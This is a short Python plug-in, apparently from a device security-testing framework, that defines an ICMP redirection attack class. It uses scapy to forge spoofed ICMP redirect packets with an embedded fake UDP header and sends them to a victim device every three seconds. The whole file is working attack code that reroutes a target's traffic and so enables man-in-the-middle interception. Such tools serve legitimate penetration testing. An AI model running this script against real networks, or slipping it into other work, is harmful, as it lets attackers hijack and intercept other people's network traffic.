from generic_attack import *
import logging
import time
log = logging.getLogger(__name__)
from scapy.all import *

class IcmpRedirection(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(IcmpRedirection, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']
        redirect_ip = self.config['target_ip']
        gateway_ip = self.device['gateway-ip']
        """ Send ICMP redirects to the victim
                """
        # icmp redirect
        pkt = IP(src=redirect_ip, dst=target)
        pkt /= ICMP(type=5, code=1, gw=gateway_ip)

        # fake UDP
        pkt /= IP(src=target, dst=redirect_ip)
        pkt /= UDP()

        while self.running:
            send(pkt)
            time.sleep(3)

    def shutdown(self):
        self.running = False


